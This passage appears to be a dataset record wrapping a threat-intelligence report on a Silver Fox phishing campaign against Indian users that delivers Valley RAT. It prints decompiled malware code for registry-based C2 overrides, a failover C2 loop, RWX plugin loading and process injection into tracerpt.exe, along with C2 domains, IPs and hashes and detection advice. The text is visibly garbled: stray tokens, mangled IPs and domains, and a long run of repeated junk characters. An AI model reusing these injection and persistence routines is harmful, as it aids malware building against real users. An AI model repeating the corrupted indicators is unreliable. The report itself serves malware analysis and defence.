TCP socket)  \n\n## Operational Parameters (5 parameters):  \n\n- dd: - Initial sleep delay (seconds) before first C2 contact- cl: - Callback interval (seconds) between beaconing attempts- bb: - Build/bot version identifier (observed: 1.0)- bz: - Backup C2 address- fz: - Unknown parameter  \n\n## Feature Flags (8 boolean parameters):  \n\n- kl: - Keylogger (1 = enabled, 0 = disabled)- sh: - Remote shell access (1 = enabled, 0 = disabled)- bd: - Full backdoor mode (1 = enabled, 0 = disabled)- dl: - Download/file transfer capability- jp:, sx:, bh:, ll: - Additional feature toggles  \n\n## Stage 2  \n\nAfter loading the embedded configuration, Valley RAT queries the Windows registry for updated C2 infrastructure:\n\n<--- Page Split --->\ncbData = 0; \n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\", 0, KEY_READ, &phkResult))\nRegQueryValueExW(phkResult, L\"IpDate\", 0, &Type, 0, &cbData); \n\nif ( cbData > 0xA ) \n\nmemset( \n\na0Db1Lk1Hs0Ld0L, // \"|0:db|1:lk|1:hs|0:1d|0:11|0:hb|1:pj\n0, \n\n0x7D0u); \n\nRegQueryValueExW( \n\nphkResult, \n\nL\"IpDate\", \n\n0, \n\n&Type, \n\n(LPBYTE)a0Db1Lk1Hs0Ld0L, \n\n&cbData); \n\nsub_405D70(L\"p1:\", Source, 0); \n\nsub_405D70(L\"o1:\", Source_2, 0); \n\nsub_405D70(L\"t1:\", 0, &dword_41CA30); \n\nsub_405D70(L\"p2:\", Source_0, 0); \n\nsub_405D70(L\"o2:\", Source_1, 0); \n\nsub_405D70(L\"t2:\", 0, &dword_41CC70); \n\nsub_405D70(L\"p3:\", Source_3, 0); \n\nsub_405D70(L\"o3:\", Source_4, 0); \n\nsub_405D70(L\"t3:\", 0, &dword_41CEB0);<｜end▁of▁sentence｜>\n\n<center>Persistence </center>  \n\nIf the registry value exists and exceeds 10 bytes, Valley RAT completely replaces its embedded configuration, then re- parses only the critical C2 parameters (p1 through t3). This allows Silver Fox operators to push updated C2 addresses without deploying new binaries or regaining code execution  \n\nAfter the configuration is loaded. Valley RAT spawns its payload thread(StartAddress) which implements a 3 tier C2 communication loop.  \n\nwhile ( 1 ) \n\n{\n\nnullsub_1();\n\nif ( C2_TOGGLE_FLAG )\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p2_secondary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o2_secondary_c2);\n\nconnection_type_flag = config_t2_secondary_type;\n\nelse\n\n// Use Primary C2 Config\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p1_primary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o1_primary_port);\n\nconnection_type_flag = config_t1_primary_type;\n\nC2_TOGGLE_FLAG = C2_TOGGLE_FLAG == 0;\n\nif ( ++failed_connection_counter == 200 )\n\nnullsub_1();\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p3_tertiary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o3_tertiary_port);\n\nconnection_type_flag = config_t3_tertiary_type;\n\nfailed_connection_counter = 0;\n\nif ( v2 )\n\n(**void (_thiscall ***)(void *))v2)(v2);\n\nv2 = (void *)v15;\n\nif ( connection_type_flag != 1 )<｜end▁of▁sentence｜>\n  \n\nThe communication loop implements multi- tier failover by alternating between primary (p1) and secondary (p2) C2 servers, switching to tertiary (p3) after 200 failures. It supports both HTTP/HTTPS and raw TCP protocols, uses configurable beaconing intervals (cl:) to reduce detection, and delays initial connection (dd:) to evade sandboxes.  \n\nUpon successful connection, Valley RAT sends a \"ready\" beacon (command ID: 4), enables keylogging if configured (kl: flag), and waits for C2 commands. This architecture maps to the discovered infrastructure: b[.jyuxuanow[.]top (103.20.195[.]147) as primary shellcode C2, with secondary/tertiary\n\n<--- Page Split --->\n\ntiers rotating through domains like itdd[.]club, gov- a[.]work, and xzghjec[.]com.  \n\nif (!RegCreateKeyW(HKEY_CURRENT_USER, L\"Console\\\\0\", &hKey)) \n\n{\n\nRegDeleteValueW(hKey, L\"d33f351a4aeea5e608853d1a56661059\");\n\nRegSetValueExW(hKey, L\"d33f351a4aeea5e608853d1a56661059\", 0, REG_BINARY, (const BYTE *)dst, cbData);\n\n}\n\nRegCloseKey(hKey);\n\noperator delete[](dst);\n\n}\n\nArgList_1 = ArgLista;\n\nv8 = _beginthreadex(0, 0, sub_4052C0, ArgLista, 0, 0);\n\ngoto LABEL_21;\n\ntype = 3;\n\nbData = 0;\n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\\\\0\", 0, KEY_READ, &phkResult))\n\nRegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, 0, &cbData);\n\nif ( cbData > 0xA44 )\n\ndst_1 = (char *)operator new[](cbData);\n\nmemset(dst_1, 0, cbData);\n\nif (!RegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, (LPBYTE)dst_1, &cbData))\n\n{\n\nqmemcpy(&dst_, dst_1, 0xA44u);\n\nlpAddress = VirtualAlloc(0, Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\nmemcpy_0(lpAddress, dst_1 + 2628, Size);\n\n}\n\nhKey_1 = hKey;\n\n}\n\nRegCloseKey(phkResult);\n\nArgList_1 = ArgLista;<｜end▁of▁sentence｜>\n  \n\nValley RAT implements a modular plugin architecture that enables dynamic capability extension through registry- based persistence. The malware stores downloaded plugins in HKCU\\Console\\0\\d33f351a4aeea5e608853d1a56661059 a registry value name consistent with Valley RAT's established fingerprint, following the MD5 hash naming convention observed across multiple Valley RAT campaigns. The plugin manager operates in two modes: it either receives modules from the C2 server, allocates executable memory with PAGE_EXECUTE_READWRITE permissions, and persists the 2628- byte configuration plus payload code to the registry as REG_BINARY data, or it retrieves previously stored plugins from the registry, validates them against a hardcoded signature, and spawns execution threads.  \n\nEach plugin includes a magic byte guard (0xC9) to prevent double- execution. This architecture allows Silver Fox operators to deploy specialized capabilities such as advanced keylogging, credential harvesting, or lateral movement modules on- demand to compromised systems, with automatic persistence across reboots through registry storage.  \n\nGetSystemDirectoryA(Buffer, @xFFu); \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\SysWOW64\\\\tracerpt.exe\"); \n\nif ( GetFileAttributesA(Buffer) == -1 ) \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\System32\\\\tracerpt.exe\"); \n\nresult = CreateProcessA(Buffer, 0, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &StartupInfo, lpProcessInformation); \n\nif ( result ) \n\nlpBaseAddress = VirtualAllocEx( \n\nlpProcessInformation->hProcess, 0, \n\ndwSize, \n\nMEM_COMMIT | MEM_RESERVE, \n\nPAGE_EXECUTE_READWRITE); \n\nif ( lpBaseAddress \n\n&& WriteProcessMemory(lpProcessInformation->hProcess, lpBaseAddress, lpBuffer, dwSize, 0) \n\n&& (hThread = lpProcessInformation->hThread, Context.ContextFlags = 65543, GetThreadContext(hThread, &Context)) \n\n&& (hThread_1 = lpProcessInformation->hThread, \n\nContext.Eip = (DWORD)lpBaseAddress, \n\nSetThreadContext(hThread_1, &Context)) ) \n\n{ \n\nResumeThread(lpProcessInformation->hThread); \n\nreturn 1;<｜end▁of▁sentence｜>\n\n<center>Tracerpt Injection </center>  \n\nAfter downloading plugins from the C2 server, Valley RAT injects them into tracerpt.exe, a legitimate signed Microsoft utility, using the same process following. The malware creates the process in a suspended state, injects the plugin code into its memory, and redirects execution to the malicious payload. Before injection, it patches the plugin with the same 4768- byte configuration containing C2 addresses and feature flags analyzed earlier.  \n\n## Pivoting  \n\nLet's start with the C2 embedded within the decoy document \"ggwk[.]cc\".\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n  \n\nThe C2 has 2 different titles over time, all of them in- line with the Income- tax- themed phishing lure, both from the same ASN. However, there's a common denominator - the favicon.  \n\n<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nWe found 10+ domains that share the same favicon. If we look at the http response titles, we can see that all the titles are Income-tax-themed. The results can be validated against VT to discover additional samples from this campaign. Refer to the IOCs section below.  \n\n<｜end▁of▁sentence｜>\n  \n\n## Diamond Model  \n\n## ADVERSARY \n\nThreat Actor: Silver Fox APT \n\nAttribution Confidence: High \n\nRationale: \n\nRaze of income-tax-themed lures previously observed in Silver Fox operations \n\nNGSI = signed binary DLL hijacking = Donut schedule chain consistent with Chinese APT toolchain \n\nMotivations: Espionage / long-term access \n\nSophistication: High (anti-analysis, in-memory execution, living-off-the-land abuse) \n\n## VICTIM \n\n### Target Profile \n\nIndian enterprises and users \n\nFrance, tax, and business-relevant personas \n\n### Exposures \n\nUser-level compromise escalating to persistent RAT control \n\nLong dwell time risk due to stealthy registry persistence \n\n### Operational Risk \n\nSilent surveillance \n\nCredential theft \n\nSelective deployment of high-risk modules only when needed \n\n## Silver Fox APT - IncomeTax Campaign \n\n### CAPABILITY \n\n### Initial Access \n\nPhishing with government-themed PDF lure \n\n### Execution & Loader Chain \n\nNESS installer \n\nSigned binary DLL hijacking \n\nProcess hooking into explorer.exe \n\nDonut-generated in-memory loader \n\n### Stage 4: Valley RAT Core \n\nTwo-stage configuration system (embedded + registry override) \n\n22-parameter operational config \n\nMulti-tier CI loop with protocol switching \n\n### Post-Compromise Capabilities \n\nKeylogging (M) \n\nInteractive shell (sh) \n\nFile download / upload (df) \n\nFull backdoor mode (xd) \n\n### Modular Expansion \n\nPlugin delivery via CI \n\nIn-memory execution + registry persistence \n\nPlugin integrity checks and execution guards \n\n## INFRASTRUCTURE \n\nInitial Redirect / Decoy Hosting \n\ngop@.ix \n\nIP: 45.207.231.94 \n\nCommand & Control \n\nN: [yuxuanow].top \n\nIP: 103.20.199.2147 \n\nPlotted Infrastructure (Shared Favorites / Patrolled Domains) \n\nlald.club = 45.207.231.107 \n\ngov=work, gov=a.fh, gov=a.club, gov=c.club, gov.club, gov=b.club = 160.124.3.103 \n\nxqghw.com = 8.217.9.165 \n\ndngtaki.cn = 47.239.225.43 \n\nhiko.cn, kiyoi.club, hhmm.wark = 43.100.22.158 \n\nsec2020gb.cn, 2025wmm.cn = 43.100.123.207 \n\nhiko.wark = 43.100.63.145 \n\n### ASN reuse over time: AS112839, AS149801 \n\n### Design Characteristics \n\nThree-tier failover with retry thresholds (200 failures) \n\nMixed protocol support (HTTPs) + two TCPs \n\nRegistry-driven dynamic CI updates \n\nResilience Features<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\n## Impact  \n\nHigh risk of long- term undetected compromise: Registry- resident plugins and delayed beaconing allow the RAT to survive reboots while remaining low- noise. Dynamic threat evolution post- infection: Attackers can upgrade capabilities (keylogging, credential theft, lateral movement) without taking initial access again or malware redeployment. Infrastructure- based blocking is brittle: Tiered C2 failover and protocol switching reduce the effectiveness of static IP/domain blocking. Reduced visibility for incident response: In- memory execution combined with registry- based persistence complicates timeline reconstruction and malware eradication. Elevated data security risk: On- demand module delivery enables targeted credential harvesting and surveillance tailored to victim role and value.  \n\n## Recommendations  \n\nMonitor registry abuse as a persistence layer: Alert on executable REG_BINARY blobs and anomalous values under non- standard paths such as HKCU\\Console\\*, especially those written by user processes. Detect multi- tier C2 logic, not just domains: Build detections for retry- heavy outbound connections, protocol switching (HTTP \\(\\leftrightarrow\\) raw TCP), delayed first beacon, and repeated failures followed by fallback behavior. Instrument memory- permission anomalies: Alert on processes allocating PAGE_EXECUTE_READWRITE memory followed by thread creation, particularly inside explorer.exe. Hunt for signed binary + local DLL load patterns: Correlate execution of signed binaries from temp directories with unsigned DLL loads and immediate child thread creation. Treat RAT feature enablement as an alerting signal: Monitor sudden activation of keylogging APIs, interactive shell behavior, or file transfer operations within long- running, previously quiet processes.  \n\n## Appendix  \n\n## IOCs  \n\n<table><tr><td>Indicator Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Sha256 Hash</td><td>77ea62ff74a66f61a511eb6b6edac20be9822fa9cc1e7354a8cd6379c7b9d2d2</td><td>Stage 1</td></tr><tr><td>Sha256 Hash</td><td>fa388a6cdd28ad5dd83acd674483828251f21cbefaa801e839ba39af24a6ac19</td><td>Stage 2</td></tr><tr><td>Sha256 Hash</td><td>f74017b406e993bea5212615febe23198b09ecd73ab79411a9f6571ba1f94cfa</td><td>Stage 3</td></tr><tr><td>Sha256 Hash</td><td>068e49e734c2c7be4fb3f01a40bb8beb2d5f4677872fabbed7741245a7ea97c</td><td>Stage 4</td></tr><tr><td>Domain</td><td>ggwk[.]cc</td><td>Embedded<br>Domain Within<br>Decoy Attachment</td></tr></table>\n\n<--- Page Split --->\n\n\n<table><tr><td>Indicator<br>Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Domain</td><td>b[.]yuxuanow[.]top</td><td>Shellcode C2</td></tr><tr><td>IP</td><td>45.207.231[.]94</td><td>Resolution from<br>ggwk[.]cc</td></tr><tr><td>IP</td><td>103.20.195[.]147</td><td>Resolution from<br>b[.]yuxuanow[.]top</td></tr></table>", "format_code": "sub_405D70(\"L\\\"p1:\\\",Source,0);sub_405D70(\"L\\\"o1:\\\",Source_2,0);sub_405D70(\"L\\\"t1:\\\",0,(int)&dword_41CA30);sub_405D70(\"L\\\"p2:\\\",Source_0,0);sub_405D70(\"L\\\"o2:\\\",Source_1,0);sub_405D70(\"L\\\"t2:\\\",0,(int)&dword_41CC70);sub_405D70(\"L\\\"p3:\\\",Source_3,0);sub_405D70(\"L\\\"o3:\\\",Source_4,0);sub_405D70(\"L\\\"t3:\\\",0,(int)&dword_41CE80);", "hash": "hash"}
{"file_name": "fed9c11a-b86a-49a9-a9e2-24332f01a81c.md", "title": "Silver Fox Targeting India Using Tax Themed Phishing Lures", "malicious_code": "sub_405D70(\"L\\\"dd:\\\",\" , word_41CEF0, 0);\nsub_405D70(\"L\\\"cl:\\\",\" , word_41CF2C, 0);\nsub_405D70(\"L\\\"bb:\\\",\" , &word_41CF4, 0);\nsub_405D70(\"L\\\"bb:\\\",\" , &word_41CFF4, 0);\nsub_405D70(\"L\\\"jp:\\\",\" , 0, (int)&unk_41D058);\nsub_405D70(\"L\\\"sx:\\\",\" , 0, (int)&unk_41D05C);\nsub_405D70(\"L\\\"bh:\\\",\" , 0, (int)&unk_41D060);\nsub_405D70(\"L\\\"ll:\\\",\" , 0, (int)&unk_41D064);\nsub_405D70(\"L\\\"dl:\\\",\" , 0, (int)&unk_41D06C);\nsub_405D70(\"L\\\"bd:\\\",\" , 0, (int)&unk_41D074);", "describe": "cloudsek.com/blog/silver- fox- targeting- india- using- tax- themed- phishing- lures  \n\nPrajwal Awasthi  \n\nTable of Content  \n\nSubscribe to CloudSEK Resources  \n\nGet the latest industry news, threats and resources.  \n\n## Executive Summary  \n\nCloudSEK's TRIAD discovered a campaign by Silver Fox APT targeting India with Income tax themed phishing lures. The lure is visually identical to the ones discovered by other vendors, however, this campaign has not been attributed to a specific threat actor before this report. Attribution accuracy is critical to threat intelligence; it enables defenders to predict adversary behavior and deploy targeted countermeasures. Misattribution from trusted sources propagates through threat feeds and detection systems, causing organizations to focus on the wrong threat while the actual adversary operates undetected. Attributing this campaign to SideWinder APT (India- aligned) contradicts basic victimology and creates systemic confusion. Using our report aims to highlight the sophisticated kill chain by the Chinese APT group, and explains the rationale behind CloudSEK's attribution.  \n\n## Kill Chain  \n\n<｜end▁of▁sentence｜>\n  \n\n## Initial Access Vector  \n\nTOPSOE INDIA PRIVATE LIMITED \n\n \n\nस्वरोचन ने अधिकार - Allgate/1/6/6/6/6/6/6/6/6/6/6/1/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/